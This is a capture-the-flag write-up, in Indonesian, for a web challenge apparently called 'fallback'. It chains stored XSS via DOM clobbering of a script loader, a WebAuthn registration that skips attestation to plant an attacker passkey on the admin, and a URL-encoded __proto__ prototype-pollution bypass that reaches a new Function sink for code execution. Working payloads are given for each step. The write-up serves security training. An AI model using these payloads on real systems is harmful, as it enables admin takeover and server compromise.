# fallback — Writeup

Challenge web: portal incident/report (Bun + Hono + EJS, SQLite) dengan auth WebAuthn passkey dan bot admin yang me-review incident. Flag ada di `/flag.txt` di dalam container app.

## Ringkasan bug

| # | Bug | Lokasi |
|---|-----|--------|
| 1 | Sanitizer HTML lemah (hanya buang `<script>`, `on*=`, `javascript:`) | `src/lib.ts` `sanitizeIncidentHtml` |
| 2 | `review-loader.js` memuat script dari field yang bisa di-inject | `public/review-loader.js` + `views/review.ejs` |
| 3 | Attestation WebAuthn tidak diverifikasi → passkey bisa didaftarkan dengan public key milik attacker | `src/passkeys.ts` `readRegistrationPayload` |
| 4 | `compatPatch` bisa menembus blokir via URL-encoding (`%5f%5fproto%5f%5f`) → prototype pollution | `src/lib.ts` `validateCompatPatch`/`applyCompatPatch` |
| 5 | `runPostRender` menjalankan `new Function("rows","Bun","process", ...)` → RCE | `src/lib.ts` `runPostRender` |

## Langkah exploit

### 1. Inject script lewat body incident

`views/review.ejs` merender `body_html` mentah (`<%- %>`), dan di akhir body memuat
`/static/review-loader.js`:

```js
const namedReviewConfig = document.forms.namedItem("reviewConfig");
const config = window.reviewConfig || namedReviewConfig || {};
let assetUrl = "/static/review-safe.js";
if (config.assetUrl && typeof config.assetUrl.value === "string") {
  assetUrl = config.assetUrl.value;           // <-- dikendalikan penyerang
}
const script = document.createElement("script");
script.src = assetUrl;
document.body.appendChild(script);
```

Sanitizer tidak membuang `<form>`/`<input>`, dan `data:text/javascript;base64,...`
tidak mengandung pola yang diblokir. Body incident:

```html
<form name="reviewConfig"><input name="assetUrl" value="data:text/javascript;base64,<XSS_JS>"></form>
```

Saat bot admin membuka `/admin/reviews/<id>`, `review-loader.js` memuat data URL
tersebut sebagai script di origin admin.

### 2. Daftarkan passkey admin dengan public key attacker

`readRegistrationPayload` hanya memvalidasi `clientDataJSON` (type/challenge/origin)
dan flag `UP|AT` pada `authenticatorData`. Tidak ada verifikasi attestation, jadi
public key apa pun diterima. Script XSS cukup memanggil endpoint registrasi dengan
public key milik attacker:

```js
const r = await fetch('/api/passkeys/register/options').then(r => r.json());
// authenticatorData: sha256(rpId) || flags(0x41) || signCount
await fetch('/api/passkeys/register/verify', {
  method: 'POST', headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    id: CRED_ID,
    challengeId: r.challengeId,
    response: { clientDataJSON, authenticatorData, publicKey: SPKI_B64URL, transports: [] }
  })
});
```

### 3. Login sebagai admin via passkey

`/api/passkeys/login/options?username=admin` lalu tanda tangani assertion dengan
private key attacker (ECDSA P-256, DER):

```
signature = sign(authData || sha256(clientDataJSON))
```

POST ke `/api/passkeys/login/verify` → server `issueSession(..., "passkey")` →
session `auth_level = passkey` (elevated).

### 4. Prototype pollution → RCE → flag

`validateCompatPatch` hanya memeriksa key **mentah** untuk `__proto__`, lalu
`applyCompatPatch` men-decode `%xx` **setelahnya**. Key
`%5f%5fproto%5f%5f.postRenderFormula` lolos validasi dan menulis ke
`Object.prototype.postRenderFormula`. Lalu `runPostRender`:

```js
const compile = new Function("rows", "Bun", "process", hookSource);
```

Payload `compatPatch`:

```json
{ "%5f%5fproto%5f%5f.postRenderFormula": "return Bun.spawnSync([\"cat\",\"/flag.txt\"]).stdout.toString()" }
```

Import lewat `POST /api/admin/report-profiles/import`, lalu
`GET /admin/reports/<reportId>/render` → flag muncul di `<pre>` (dibaca dari
`/flag.txt`).

## Otomasi

`solutions/fallback/solve.mjs` mengerjakan semua langkah di atas:

```bash
docker compose up --build          # di folder fallback/
node solutions/fallback/solve.mjs  # dari root repo
# [FLAG] PLAYIT{fake}
```

> Terverifikasi jalan (build + solver menghasilkan `PLAYIT{fake}`).
> Flag default di image adalah `PLAYIT{fake}` (lihat `Dockerfile`).
